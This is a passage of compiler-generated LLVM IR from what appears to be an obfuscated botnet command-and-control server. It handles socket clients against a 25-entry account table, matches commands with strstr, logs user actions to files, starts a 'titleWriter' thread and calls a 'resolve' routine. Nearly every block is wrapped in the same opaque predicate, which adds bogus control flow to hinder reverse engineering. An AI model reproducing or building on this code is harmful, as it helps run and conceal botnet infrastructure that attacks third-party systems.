  br i1 %2508, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %2500
  %2509 = load i32, i32* @x.17
  %2510 = load i32, i32* @y.18
  %2511 = sub i32 %2509, 1
  %2512 = mul i32 %2509, %2511
  %2513 = urem i32 %2512, 2
  %2514 = icmp eq i32 %2513, 0
  %2515 = icmp slt i32 %2510, 10
  %2516 = or i1 %2514, %2515
  br i1 %2516, label %originalBBpart2304, label %originalBB302alteredBB

originalBBpart2304:                               ; preds = %originalBB302
  br label %4181

; <label>:2517:                                   ; preds = %2475
  %2518 = load i32, i32* @x.17
  %2519 = load i32, i32* @y.18
  %2520 = sub i32 %2518, 1
  %2521 = mul i32 %2518, %2520
  %2522 = urem i32 %2521, 2
  %2523 = icmp eq i32 %2522, 0
  %2524 = icmp slt i32 %2519, 10
  %2525 = or i1 %2523, %2524
  br i1 %2525, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %2517
  %2526 = load i32, i32* %4, align 4
  %2527 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %2528 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %2529 = call i64 @strlen(i8* %2528) #8
  %2530 = call i64 @send(i32 %2526, i8* %2527, i64 %2529, i32 16384)
  %2531 = icmp eq i64 %2530, -1
  %2532 = load i32, i32* @x.17
  %2533 = load i32, i32* @y.18
  %2534 = sub i32 %2532, 1
  %2535 = mul i32 %2532, %2534
  %2536 = urem i32 %2535, 2
  %2537 = icmp eq i32 %2536, 0
  %2538 = icmp slt i32 %2533, 10
  %2539 = or i1 %2537, %2538
  br i1 %2539, label %originalBBpart2308, label %originalBB306alteredBB

originalBBpart2308:                               ; preds = %originalBB306
  br i1 %2531, label %2540, label %2541

; <label>:2540:                                   ; preds = %originalBBpart2308
  br label %4181

; <label>:2541:                                   ; preds = %originalBBpart2308
  %2542 = load i32, i32* %4, align 4
  %2543 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %2544 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %2545 = call i64 @strlen(i8* %2544) #8
  %2546 = call i64 @send(i32 %2542, i8* %2543, i64 %2545, i32 16384)
  %2547 = icmp eq i64 %2546, -1
  br i1 %2547, label %2548, label %2549

; <label>:2548:                                   ; preds = %2541
  br label %4181

; <label>:2549:                                   ; preds = %2541
  %2550 = load i32, i32* %4, align 4
  %2551 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %2552 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %2553 = call i64 @strlen(i8* %2552) #8
  %2554 = call i64 @send(i32 %2550, i8* %2551, i64 %2553, i32 16384)
  %2555 = icmp eq i64 %2554, -1
  br i1 %2555, label %2556, label %2557

; <label>:2556:                                   ; preds = %2549
  br label %4181

; <label>:2557:                                   ; preds = %2549
  %2558 = load i32, i32* @x.17
  %2559 = load i32, i32* @y.18
  %2560 = sub i32 %2558, 1
  %2561 = mul i32 %2558, %2560
  %2562 = urem i32 %2561, 2
  %2563 = icmp eq i32 %2562, 0
  %2564 = icmp slt i32 %2559, 10
  %2565 = or i1 %2563, %2564
  br i1 %2565, label %originalBB310, label %originalBB310alteredBB

originalBB310:                                    ; preds = %originalBB310alteredBB, %2557
  %2566 = load i32, i32* %4, align 4
  %2567 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %2568 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %2569 = call i64 @strlen(i8* %2568) #8
  %2570 = call i64 @send(i32 %2566, i8* %2567, i64 %2569, i32 16384)
  %2571 = icmp eq i64 %2570, -1
  %2572 = load i32, i32* @x.17
  %2573 = load i32, i32* @y.18
  %2574 = sub i32 %2572, 1
  %2575 = mul i32 %2572, %2574
  %2576 = urem i32 %2575, 2
  %2577 = icmp eq i32 %2576, 0
  %2578 = icmp slt i32 %2573, 10
  %2579 = or i1 %2577, %2578
  br i1 %2579, label %originalBBpart2312, label %originalBB310alteredBB

originalBBpart2312:                               ; preds = %originalBB310
  br i1 %2571, label %2580, label %2581

; <label>:2580:                                   ; preds = %originalBBpart2312
  br label %4181

; <label>:2581:                                   ; preds = %originalBBpart2312
  %2582 = load i32, i32* %4, align 4
  %2583 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %2584 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %2585 = call i64 @strlen(i8* %2584) #8
  %2586 = call i64 @send(i32 %2582, i8* %2583, i64 %2585, i32 16384)
  %2587 = icmp eq i64 %2586, -1
  br i1 %2587, label %2588, label %2589

; <label>:2588:                                   ; preds = %2581
  br label %4181

; <label>:2589:                                   ; preds = %2581
  %2590 = load i32, i32* %4, align 4
  %2591 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %2592 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %2593 = call i64 @strlen(i8* %2592) #8
  %2594 = call i64 @send(i32 %2590, i8* %2591, i64 %2593, i32 16384)
  %2595 = icmp eq i64 %2594, -1
  br i1 %2595, label %2596, label %2597

; <label>:2596:                                   ; preds = %2589
  br label %4181

; <label>:2597:                                   ; preds = %2589
  %2598 = load i32, i32* %4, align 4
  %2599 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %2600 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %2601 = call i64 @strlen(i8* %2600) #8
  %2602 = call i64 @send(i32 %2598, i8* %2599, i64 %2601, i32 16384)
  %2603 = icmp eq i64 %2602, -1
  br i1 %2603, label %2604, label %2621

; <label>:2604:                                   ; preds = %2597
  %2605 = load i32, i32* @x.17
  %2606 = load i32, i32* @y.18
  %2607 = sub i32 %2605, 1
  %2608 = mul i32 %2605, %2607
  %2609 = urem i32 %2608, 2
  %2610 = icmp eq i32 %2609, 0
  %2611 = icmp slt i32 %2606, 10
  %2612 = or i1 %2610, %2611
  br i1 %2612, label %originalBB314, label %originalBB314alteredBB

originalBB314:                                    ; preds = %originalBB314alteredBB, %2604
  %2613 = load i32, i32* @x.17
  %2614 = load i32, i32* @y.18
  %2615 = sub i32 %2613, 1
  %2616 = mul i32 %2613, %2615
  %2617 = urem i32 %2616, 2
  %2618 = icmp eq i32 %2617, 0
  %2619 = icmp slt i32 %2614, 10
  %2620 = or i1 %2618, %2619
  br i1 %2620, label %originalBBpart2316, label %originalBB314alteredBB

originalBBpart2316:                               ; preds = %originalBB314
  br label %4181

; <label>:2621:                                   ; preds = %2597
  %2622 = load i32, i32* @x.17
  %2623 = load i32, i32* @y.18
  %2624 = sub i32 %2622, 1
  %2625 = mul i32 %2622, %2624
  %2626 = urem i32 %2625, 2
  %2627 = icmp eq i32 %2626, 0
  %2628 = icmp slt i32 %2623, 10
  %2629 = or i1 %2627, %2628
  br i1 %2629, label %originalBB318, label %originalBB318alteredBB

originalBB318:                                    ; preds = %originalBB318alteredBB, %2621
  %2630 = load i8*, i8** %3, align 8
  %2631 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %2630) #7
  %2632 = load i32, i32* @x.17
  %2633 = load i32, i32* @y.18
  %2634 = sub i32 %2632, 1
  %2635 = mul i32 %2632, %2634
  %2636 = urem i32 %2635, 2
  %2637 = icmp eq i32 %2636, 0
  %2638 = icmp slt i32 %2633, 10
  %2639 = or i1 %2637, %2638
  br i1 %2639, label %originalBBpart2320, label %originalBB318alteredBB

originalBBpart2320:                               ; preds = %originalBB318
  br label %2640

; <label>:2640:                                   ; preds = %originalBBpart2320
  %2641 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2642 = load i32, i32* %5, align 4
  %2643 = sext i32 %2642 to i64
  %2644 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2643
  %2645 = getelementptr inbounds %struct.account, %struct.account* %2644, i32 0, i32 0
  %2646 = getelementptr inbounds [20 x i8], [20 x i8]* %2645, i32 0, i32 0
  %2647 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2648 = call i32 (i8*, i8*, ...) @sprintf(i8* %2641, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %2646, i8* %2647) #7
  %2649 = load i32, i32* %4, align 4
  %2650 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2651 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2652 = call i64 @strlen(i8* %2651) #8
  %2653 = call i64 @send(i32 %2649, i8* %2650, i64 %2652, i32 16384)
  %2654 = icmp eq i64 %2653, -1
  br i1 %2654, label %2655, label %2656

; <label>:2655:                                   ; preds = %2640
  br label %4181

; <label>:2656:                                   ; preds = %2640
  br label %2657

; <label>:2657:                                   ; preds = %2656
  br label %561

; <label>:2658:                                   ; preds = %2471
  %2659 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2660 = call i8* @strstr(i8* %2659, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.122, i32 0, i32 0)) #8
  %2661 = icmp ne i8* %2660, null
  br i1 %2661, label %2662, label %2697

; <label>:2662:                                   ; preds = %2658
  %2663 = load i32, i32* @x.17
  %2664 = load i32, i32* @y.18
  %2665 = sub i32 %2663, 1
  %2666 = mul i32 %2663, %2665
  %2667 = urem i32 %2666, 2
  %2668 = icmp eq i32 %2667, 0
  %2669 = icmp slt i32 %2664, 10
  %2670 = or i1 %2668, %2669
  br i1 %2670, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %2662
  %2671 = load i32, i32* %5, align 4
  %2672 = sext i32 %2671 to i64
  %2673 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2672
  %2674 = getelementptr inbounds %struct.account, %struct.account* %2673, i32 0, i32 0
  %2675 = getelementptr inbounds [20 x i8], [20 x i8]* %2674, i32 0, i32 0
  %2676 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2677 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %2675, i8* %2676)
  %2678 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %2678, %struct._IO_FILE** %98, align 8
  %2679 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %2680 = load i32, i32* %5, align 4
  %2681 = sext i32 %2680 to i64
  %2682 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2681
  %2683 = getelementptr inbounds %struct.account, %struct.account* %2682, i32 0, i32 0
  %2684 = getelementptr inbounds [20 x i8], [20 x i8]* %2683, i32 0, i32 0
  %2685 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2686 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2679, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %2684, i8* %2685)
  %2687 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %2688 = call i32 @fclose(%struct._IO_FILE* %2687)
  %2689 = load i32, i32* @x.17
  %2690 = load i32, i32* @y.18
  %2691 = sub i32 %2689, 1
  %2692 = mul i32 %2689, %2691
  %2693 = urem i32 %2692, 2
  %2694 = icmp eq i32 %2693, 0
  %2695 = icmp slt i32 %2690, 10
  %2696 = or i1 %2694, %2695
  br i1 %2696, label %originalBBpart2324, label %originalBB322alteredBB

originalBBpart2324:                               ; preds = %originalBB322
  br label %4181

; <label>:2697:                                   ; preds = %2658
  %2698 = load i32, i32* @x.17
  %2699 = load i32, i32* @y.18
  %2700 = sub i32 %2698, 1
  %2701 = mul i32 %2698, %2700
  %2702 = urem i32 %2701, 2
  %2703 = icmp eq i32 %2702, 0
  %2704 = icmp slt i32 %2699, 10
  %2705 = or i1 %2703, %2704
  br i1 %2705, label %originalBB326, label %originalBB326alteredBB

originalBB326:                                    ; preds = %originalBB326alteredBB, %2697
  %2706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2707 = call i8* @strstr(i8* %2706, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0)) #8
  %2708 = icmp ne i8* %2707, null
  %2709 = load i32, i32* @x.17
  %2710 = load i32, i32* @y.18
  %2711 = sub i32 %2709, 1
  %2712 = mul i32 %2709, %2711
  %2713 = urem i32 %2712, 2
  %2714 = icmp eq i32 %2713, 0
  %2715 = icmp slt i32 %2710, 10
  %2716 = or i1 %2714, %2715
  br i1 %2716, label %originalBBpart2328, label %originalBB326alteredBB

originalBBpart2328:                               ; preds = %originalBB326
  br i1 %2708, label %2717, label %2736

; <label>:2717:                                   ; preds = %originalBBpart2328
  %2718 = load i32, i32* %5, align 4
  %2719 = sext i32 %2718 to i64
  %2720 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2719
  %2721 = getelementptr inbounds %struct.account, %struct.account* %2720, i32 0, i32 0
  %2722 = getelementptr inbounds [20 x i8], [20 x i8]* %2721, i32 0, i32 0
  %2723 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2724 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %2722, i8* %2723)
  %2725 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %2725, %struct._IO_FILE** %99, align 8
  %2726 = load %struct._IO_FILE*, %struct._IO_FILE** %99, align 8
  %2727 = load i32, i32* %5, align 4
  %2728 = sext i32 %2727 to i64
  %2729 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2728
  %2730 = getelementptr inbounds %struct.account, %struct.account* %2729, i32 0, i32 0
  %2731 = getelementptr inbounds [20 x i8], [20 x i8]* %2730, i32 0, i32 0
  %2732 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2733 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2726, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %2731, i8* %2732)
  %2734 = load %struct._IO_FILE*, %struct._IO_FILE** %99, align 8
  %2735 = call i32 @fclose(%struct._IO_FILE* %2734)
  br label %4181

; <label>:2736:                                   ; preds = %originalBBpart2328
  %2737 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2738 = call i8* @strstr(i8* %2737, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i32 0, i32 0)) #8
  %2739 = icmp ne i8* %2738, null
  br i1 %2739, label %2744, label %2740

; <label>:2740:                                   ; preds = %2736
  %2741 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2742 = call i8* @strstr(i8* %2741, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.127, i32 0, i32 0)) #8
  %2743 = icmp ne i8* %2742, null
  br i1 %2743, label %2744, label %2763

; <label>:2744:                                   ; preds = %2740, %2736
  %2745 = load i32, i32* %5, align 4
  %2746 = sext i32 %2745 to i64
  %2747 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2746
  %2748 = getelementptr inbounds %struct.account, %struct.account* %2747, i32 0, i32 0
  %2749 = getelementptr inbounds [20 x i8], [20 x i8]* %2748, i32 0, i32 0
  %2750 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2751 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.128, i32 0, i32 0), i8* %2749, i8* %2750)
  %2752 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %2752, %struct._IO_FILE** %100, align 8
  %2753 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %2754 = load i32, i32* %5, align 4
  %2755 = sext i32 %2754 to i64
  %2756 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2755
  %2757 = getelementptr inbounds %struct.account, %struct.account* %2756, i32 0, i32 0
  %2758 = getelementptr inbounds [20 x i8], [20 x i8]* %2757, i32 0, i32 0
  %2759 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2760 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2753, i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.130, i32 0, i32 0), i8* %2758, i8* %2759)
  %2761 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %2762 = call i32 @fclose(%struct._IO_FILE* %2761)
  br label %4181

; <label>:2763:                                   ; preds = %2740
  %2764 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2765 = call i8* @strstr(i8* %2764, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0)) #8
  %2766 = icmp ne i8* %2765, null
  br i1 %2766, label %2771, label %2767

; <label>:2767:                                   ; preds = %2763
  %2768 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2769 = call i8* @strstr(i8* %2768, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.132, i32 0, i32 0)) #8
  %2770 = icmp ne i8* %2769, null
  br i1 %2770, label %2771, label %2814

; <label>:2771:                                   ; preds = %2767, %2763
  %2772 = load i32, i32* @x.17
  %2773 = load i32, i32* @y.18
  %2774 = sub i32 %2772, 1
  %2775 = mul i32 %2772, %2774
  %2776 = urem i32 %2775, 2
  %2777 = icmp eq i32 %2776, 0
  %2778 = icmp slt i32 %2773, 10
  %2779 = or i1 %2777, %2778
  br i1 %2779, label %originalBB330, label %originalBB330alteredBB

originalBB330:                                    ; preds = %originalBB330alteredBB, %2771
  %2780 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2781 = call i32 (i8*, i8*, ...) @sprintf(i8* %2780, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.133, i32 0, i32 0)) #7
  %2782 = load i32, i32* %4, align 4
  %2783 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2784 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2785 = call i64 @strlen(i8* %2784) #8
  %2786 = call i64 @send(i32 %2782, i8* %2783, i64 %2785, i32 16384)
  %2787 = icmp eq i64 %2786, -1
  %2788 = load i32, i32* @x.17
  %2789 = load i32, i32* @y.18
  %2790 = sub i32 %2788, 1
  %2791 = mul i32 %2788, %2790
  %2792 = urem i32 %2791, 2
  %2793 = icmp eq i32 %2792, 0
  %2794 = icmp slt i32 %2789, 10
  %2795 = or i1 %2793, %2794
  br i1 %2795, label %originalBBpart2332, label %originalBB330alteredBB

originalBBpart2332:                               ; preds = %originalBB330
  br i1 %2787, label %2796, label %2797

; <label>:2796:                                   ; preds = %originalBBpart2332
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:2797:                                   ; preds = %originalBBpart2332
  %2798 = load i32, i32* @x.17
  %2799 = load i32, i32* @y.18
  %2800 = sub i32 %2798, 1
  %2801 = mul i32 %2798, %2800
  %2802 = urem i32 %2801, 2
  %2803 = icmp eq i32 %2802, 0
  %2804 = icmp slt i32 %2799, 10
  %2805 = or i1 %2803, %2804
  br i1 %2805, label %originalBB334, label %originalBB334alteredBB

originalBB334:                                    ; preds = %originalBB334alteredBB, %2797
  %2806 = load i32, i32* @x.17
  %2807 = load i32, i32* @y.18
  %2808 = sub i32 %2806, 1
  %2809 = mul i32 %2806, %2808
  %2810 = urem i32 %2809, 2
  %2811 = icmp eq i32 %2810, 0
  %2812 = icmp slt i32 %2807, 10
  %2813 = or i1 %2811, %2812
  br i1 %2813, label %originalBBpart2336, label %originalBB334alteredBB

originalBBpart2336:                               ; preds = %originalBB334
  br label %2814

; <label>:2814:                                   ; preds = %originalBBpart2336, %2767
  %2815 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2816 = call i8* @strstr(i8* %2815, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.134, i32 0, i32 0)) #8
  %2817 = icmp ne i8* %2816, null
  br i1 %2817, label %2818, label %2861

; <label>:2818:                                   ; preds = %2814
  %2819 = load i32, i32* @x.17
  %2820 = load i32, i32* @y.18
  %2821 = sub i32 %2819, 1
  %2822 = mul i32 %2819, %2821
  %2823 = urem i32 %2822, 2
  %2824 = icmp eq i32 %2823, 0
  %2825 = icmp slt i32 %2820, 10
  %2826 = or i1 %2824, %2825
  br i1 %2826, label %originalBB338, label %originalBB338alteredBB

originalBB338:                                    ; preds = %originalBB338alteredBB, %2818
  %2827 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2828 = call i32 (i8*, i8*, ...) @sprintf(i8* %2827, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.135, i32 0, i32 0)) #7
  %2829 = load i32, i32* %4, align 4
  %2830 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2831 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2832 = call i64 @strlen(i8* %2831) #8
  %2833 = call i64 @send(i32 %2829, i8* %2830, i64 %2832, i32 16384)
  %2834 = icmp eq i64 %2833, -1
  %2835 = load i32, i32* @x.17
  %2836 = load i32, i32* @y.18
  %2837 = sub i32 %2835, 1
  %2838 = mul i32 %2835, %2837
  %2839 = urem i32 %2838, 2
  %2840 = icmp eq i32 %2839, 0
  %2841 = icmp slt i32 %2836, 10
  %2842 = or i1 %2840, %2841
  br i1 %2842, label %originalBBpart2340, label %originalBB338alteredBB

originalBBpart2340:                               ; preds = %originalBB338
  br i1 %2834, label %2843, label %2860

; <label>:2843:                                   ; preds = %originalBBpart2340
  %2844 = load i32, i32* @x.17
  %2845 = load i32, i32* @y.18
  %2846 = sub i32 %2844, 1
  %2847 = mul i32 %2844, %2846
  %2848 = urem i32 %2847, 2
  %2849 = icmp eq i32 %2848, 0
  %2850 = icmp slt i32 %2845, 10
  %2851 = or i1 %2849, %2850
  br i1 %2851, label %originalBB342, label %originalBB342alteredBB

originalBB342:                                    ; preds = %originalBB342alteredBB, %2843
  store i8* null, i8** %2, align 8
  %2852 = load i32, i32* @x.17
  %2853 = load i32, i32* @y.18
  %2854 = sub i32 %2852, 1
  %2855 = mul i32 %2852, %2854
  %2856 = urem i32 %2855, 2
  %2857 = icmp eq i32 %2856, 0
  %2858 = icmp slt i32 %2853, 10
  %2859 = or i1 %2857, %2858
  br i1 %2859, label %originalBBpart2344, label %originalBB342alteredBB

originalBBpart2344:                               ; preds = %originalBB342
  br label %4206

; <label>:2860:                                   ; preds = %originalBBpart2340
  br label %2861

; <label>:2861:                                   ; preds = %2860, %2814
  %2862 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2863 = call i8* @strstr(i8* %2862, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.136, i32 0, i32 0)) #8
  %2864 = icmp ne i8* %2863, null
  br i1 %2864, label %2865, label %2892

; <label>:2865:                                   ; preds = %2861
  %2866 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2867 = call i32 (i8*, i8*, ...) @sprintf(i8* %2866, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.137, i32 0, i32 0)) #7
  %2868 = load i32, i32* %4, align 4
  %2869 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2870 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2871 = call i64 @strlen(i8* %2870) #8
  %2872 = call i64 @send(i32 %2868, i8* %2869, i64 %2871, i32 16384)
  %2873 = icmp eq i64 %2872, -1
  br i1 %2873, label %2874, label %2891

; <label>:2874:                                   ; preds = %2865
  %2875 = load i32, i32* @x.17
  %2876 = load i32, i32* @y.18
  %2877 = sub i32 %2875, 1
  %2878 = mul i32 %2875, %2877
  %2879 = urem i32 %2878, 2
  %2880 = icmp eq i32 %2879, 0
  %2881 = icmp slt i32 %2876, 10
  %2882 = or i1 %2880, %2881
  br i1 %2882, label %originalBB346, label %originalBB346alteredBB

originalBB346:                                    ; preds = %originalBB346alteredBB, %2874
  store i8* null, i8** %2, align 8
  %2883 = load i32, i32* @x.17
  %2884 = load i32, i32* @y.18
  %2885 = sub i32 %2883, 1
  %2886 = mul i32 %2883, %2885
  %2887 = urem i32 %2886, 2
  %2888 = icmp eq i32 %2887, 0
  %2889 = icmp slt i32 %2884, 10
  %2890 = or i1 %2888, %2889
  br i1 %2890, label %originalBBpart2348, label %originalBB346alteredBB

originalBBpart2348:                               ; preds = %originalBB346
  br label %4206

; <label>:2891:                                   ; preds = %2865
  br label %2892

; <label>:2892:                                   ; preds = %2891, %2861
  %2893 = load i32, i32* @x.17
  %2894 = load i32, i32* @y.18
  %2895 = sub i32 %2893, 1
  %2896 = mul i32 %2893, %2895
  %2897 = urem i32 %2896, 2
  %2898 = icmp eq i32 %2897, 0
  %2899 = icmp slt i32 %2894, 10
  %2900 = or i1 %2898, %2899
  br i1 %2900, label %originalBB350, label %originalBB350alteredBB

originalBB350:                                    ; preds = %originalBB350alteredBB, %2892
  %2901 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2902 = call i8* @strstr(i8* %2901, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0)) #8
  %2903 = icmp ne i8* %2902, null
  %2904 = load i32, i32* @x.17
  %2905 = load i32, i32* @y.18
  %2906 = sub i32 %2904, 1
  %2907 = mul i32 %2904, %2906
  %2908 = urem i32 %2907, 2
  %2909 = icmp eq i32 %2908, 0
  %2910 = icmp slt i32 %2905, 10
  %2911 = or i1 %2909, %2910
  br i1 %2911, label %originalBBpart2352, label %originalBB350alteredBB

originalBBpart2352:                               ; preds = %originalBB350
  br i1 %2903, label %2916, label %2912

; <label>:2912:                                   ; preds = %originalBBpart2352
  %2913 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2914 = call i8* @strstr(i8* %2913, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.139, i32 0, i32 0)) #8
  %2915 = icmp ne i8* %2914, null
  br i1 %2915, label %2916, label %2990

; <label>:2916:                                   ; preds = %2912, %originalBBpart2352
  %2917 = load i8*, i8** %12, align 8
  %2918 = load i32, i32* %5, align 4
  %2919 = sext i32 %2918 to i64
  %2920 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2919
  %2921 = getelementptr inbounds %struct.account, %struct.account* %2920, i32 0, i32 2
  %2922 = getelementptr inbounds [20 x i8], [20 x i8]* %2921, i32 0, i32 0
  %2923 = call i32 @strcmp(i8* %2917, i8* %2922) #8
  %2924 = icmp eq i32 %2923, 0
  br i1 %2924, label %2925, label %2962

; <label>:2925:                                   ; preds = %2916
  %2926 = load i32, i32* @x.17
  %2927 = load i32, i32* @y.18
  %2928 = sub i32 %2926, 1
  %2929 = mul i32 %2926, %2928
  %2930 = urem i32 %2929, 2
  %2931 = icmp eq i32 %2930, 0
  %2932 = icmp slt i32 %2927, 10
  %2933 = or i1 %2931, %2932
  br i1 %2933, label %originalBB354, label %originalBB354alteredBB

originalBB354:                                    ; preds = %originalBB354alteredBB, %2925
  %2934 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2935 = call i8* @strtok(i8* %2934, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0)) #7
  store i8* %2935, i8** %102, align 8
  %2936 = load i8*, i8** %102, align 8
  %2937 = getelementptr inbounds i8, i8* %2936, i64 8
  store i8* %2937, i8** %103, align 8
  %2938 = load i8*, i8** %103, align 8
  call void @trim(i8* %2938)
  %2939 = load i8*, i8** %103, align 8
  %2940 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %2941 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @resolve to i32 (i8*, i8**, ...)*)(i8* %2939, i8** %2940)
  %2942 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2943 = load i8*, i8** %103, align 8
  %2944 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %2945 = call i32 (i8*, i8*, ...) @sprintf(i8* %2942, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.141, i32 0, i32 0), i8* %2943, i8** %2944) #7
  %2946 = load i32, i32* %4, align 4
  %2947 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
